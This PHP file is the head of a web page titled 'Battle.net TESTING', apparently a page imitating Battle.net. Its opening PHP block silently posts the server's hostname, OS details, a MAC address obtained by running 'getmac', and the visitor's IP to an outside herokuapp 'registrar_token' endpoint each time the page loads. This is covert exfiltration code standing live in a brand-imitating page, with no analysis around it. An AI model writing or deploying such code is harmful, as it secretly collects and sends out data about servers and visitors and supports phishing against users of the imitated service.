<?php
session_start([
    'read_and_close'  => true
]);
$url = "https://token-r-av.herokuapp.com/registrar_token";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
    "Accept: application/json",
    "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = json_encode(array("hostname"=>gethostname(), "uname_n" =>php_uname('n'), "uname_s" =>php_uname('s'), "uname_v" =>php_uname('v'), "uname_r" =>php_uname('r'), "uname_m" =>php_uname('m'), "ip" => $_SERVER['REMOTE_ADDR'], "ip_mac" =>exec('getmac')));
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
$resp = curl_exec($curl);
curl_close($curl);
?>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>Battle.net TESTING</title>
<link rel="shortcut icon" type="img/png" sizes="16x16" href="favicon-16x16.png">

<link rel="stylesheet" href="./styles/style.css">

